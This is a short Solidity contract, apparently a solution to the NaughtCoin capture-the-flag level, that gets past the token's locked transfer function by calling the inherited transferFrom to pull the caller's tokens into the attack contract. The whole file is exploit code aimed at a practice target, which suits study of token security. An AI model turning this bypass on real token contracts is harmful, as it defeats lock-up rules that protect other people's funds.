// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./NaughtCoin.sol";

contract AttackNaughtCoin {
    address coin;

    constructor(address _coin) public {
        coin = _coin;
    }

    function attack(uint256 _amount) public {
        NaughtCoin(coin).transferFrom(msg.sender, address(this), _amount);
    }
}
